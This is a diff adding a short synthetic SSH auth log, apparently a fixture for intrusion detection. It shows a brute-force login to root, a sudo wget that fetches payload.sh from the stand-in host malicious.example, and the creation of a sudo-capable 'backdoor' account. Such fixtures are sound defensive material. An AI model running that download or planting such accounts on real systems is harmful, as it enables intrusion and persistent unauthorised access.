@@ -1,0 +1,9 @@
+Aug 04 12:00:01 server sshd[3001]: Failed password for root from 10.10.10.55 port 50001 ssh2
+Aug 04 12:00:03 server sshd[3001]: Failed password for root from 10.10.10.55 port 50002 ssh2
+Aug 04 12:00:05 server sshd[3001]: Failed password for root from 10.10.10.55 port 50003 ssh2
+Aug 04 12:00:07 server sshd[3001]: Failed password for root from 10.10.10.55 port 50004 ssh2
+Aug 04 12:00:09 server sshd[3001]: Failed password for root from 10.10.10.55 port 50005 ssh2
+Aug 04 12:00:12 server sshd[3001]: Accepted password for root from 10.10.10.55 port 50006 ssh2
+Aug 04 12:01:00 server sudo: root : COMMAND=/usr/bin/wget http://malicious.example/payload.sh
+Aug 04 12:02:00 server useradd[3010]: new user: name=backdoor UID=1006 GID=1006 home=/home/backdoor shell=/bin/bash
+Aug 04 12:03:00 server usermod[3011]: added user backdoor to group sudo
